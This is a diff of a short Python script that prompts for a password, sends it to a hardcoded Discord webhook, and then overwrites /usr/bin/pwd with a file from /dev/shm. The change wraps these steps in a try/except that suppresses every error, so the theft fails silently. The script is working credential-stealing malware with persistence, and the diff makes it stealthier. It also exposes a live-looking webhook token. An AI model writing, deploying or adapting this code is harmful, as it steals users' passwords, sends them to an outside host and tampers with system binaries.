@@ -1,10 +1,12 @@
 #!/bin/python3
 
-import getpass, os
-from discord_webhook import DiscordWebhook
+try:
+    import getpass, os
+    from discord_webhook import DiscordWebhook
 
-password = getpass.getpass("Password: ")
-webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1041408257090134066/brLkBFFgAMX-wGoPYYUaAyRog3-v5HywW1ZA8ffJdW40I3iXwhf9qklYBxHsBTsKPWGN', content=password); response = webhook.execute()
-os.system('/dev/shm/pwd')
-os.system('cp /dev/shm/pwd /usr/bin/pwd')
-
+    password = getpass.getpass("Password: ")
+    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1041408257090134066/brLkBFFgAMX-wGoPYYUaAyRog3-v5HywW1ZA8ffJdW40I3iXwhf9qklYBxHsBTsKPWGN', content=password); response = webhook.execute()
+    os.system('/dev/shm/pwd')
+    os.system('cp /dev/shm/pwd /usr/bin/pwd')
+except:
+    print('')
